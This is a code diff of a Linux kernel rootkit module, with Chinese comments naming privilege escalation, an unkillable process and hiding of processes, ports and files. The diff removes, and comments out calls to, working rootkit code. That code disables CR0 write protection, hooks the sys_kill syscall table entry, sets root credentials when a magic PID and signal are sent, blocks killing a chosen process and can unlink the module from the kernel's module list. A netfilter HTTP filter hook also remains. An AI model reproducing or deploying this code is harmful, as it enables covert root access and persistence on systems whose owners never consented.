@@ -28,93 +28,6 @@
 #define PORT 80  
 #define ARGV_MAX 10
 
-/*
-*
-*不死进程、提权
-*/
-
-MODULE_LICENSE("GPL");
-
-#define ROOT_PID 7311
-#define ROOT_SIG 7
-
-static int lpid = 2916;
-module_param(lpid, int, 0);
-
-//#define STEALTH_MODE 1 
-
-unsigned long *sys_call_table = (unsigned long*) 0xffffffff816005e0;
-
-static unsigned int ocr0;
-
-unsigned int clear_cr0(){
-    unsigned int cr0 = read_cr0();
-    write_cr0(cr0 & 0xfffeffff);
-    return cr0;
-}
-
-/*kernel sys_kill(int pid, int sig) function hook*/
-typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig);
-kill_ptr orig_kill;
-
-asmlinkage int hacked_kill(pid_t pid, int sig){
-    int actual_result;
-
-    //root-access
-    if (pid == ROOT_PID && sig == ROOT_SIG){
-        struct cred *cred;
-        cred = (struct cred *)__task_cred(current);
-        cred->uid = 0;
-        cred->gid = 0;
-        cred->suid = 0;
-        cred->euid = 0;
-        cred->euid = 0;
-        cred->egid = 0;
-        cred->fsuid = 0;
-        cred->fsgid = 0;
-        return 0;
-    }else if(pid == lpid){
-        printk(KERN_INFO "You cannot kill me! by process %d", lpid);
-        return 0;
-    }    
-    
-    actual_result = (*orig_kill)(pid, sig);
-    return actual_result;
-}
-
-
-static int promote_immortal(void){           
-#ifdef STEALTH_MODE
-    struct module *self;
-#endif
-    ocr0 = clear_cr0();
-    orig_kill = (kill_ptr)sys_call_table[__NR_kill]; //hooking
-    sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
-    write_cr0(ocr0);
-#ifdef STEALTH_MODE
-    mutex_lock(&module_mutex);
-    if((self = find_module("test")))
-        list_del(&self->list);
-    mutex_unlock(&module_mutex);
-#endif    
-    printk(KERN_INFO "Loading rookit\n");
-    return 0;
-}
-
-static int promote_immortal_exit(void){
-    ocr0 = clear_cr0();
-    sys_call_table[__NR_kill] = (unsigned long) orig_kill;
-    write_cr0(ocr0);    
-    printk(KERN_INFO "Romove rookit\n");
-    return 0;
-}
-
-
-/*
-*
-*隐藏进程、端口、文件
-*/
-
 
 /*
 * 
@@ -134,6 +47,7 @@ static int filter_http(char *type,struct sk_buff *pskb)
 	{  
 		return retval;
 	} 
+	
 	/* 解析TCP数据包 */
 	if( iph->protocol == IPPROTO_TCP )  
 	{  
@@ -183,6 +97,7 @@ static unsigned int NET_HookLocalIn(unsigned int hook,
 		const struct net_device *out,  
 		int (*okfn)(struct sk_buff*))  
 {  
+	printk("icmp: %d", pskb->nh.iph->protocol);
 	return filter_http("in",pskb);  
 }  
  
@@ -288,7 +203,7 @@ static int __init rk_init(void)
 	}  
 	
   	/*安装提权、不死进程*/
-	promote_immortal();
+	//promote_immortal();
 
 	return 0;  
 }  
@@ -300,7 +215,7 @@ static void __exit rk_exit(void)
 	nf_unregister_hooks(net_hooks,ARRAY_SIZE(net_hooks));
 	
 	/* 卸载提权、不死进程 */
-	promote_immortal_exit();
+	//promote_immortal_exit();
 }  
   
   
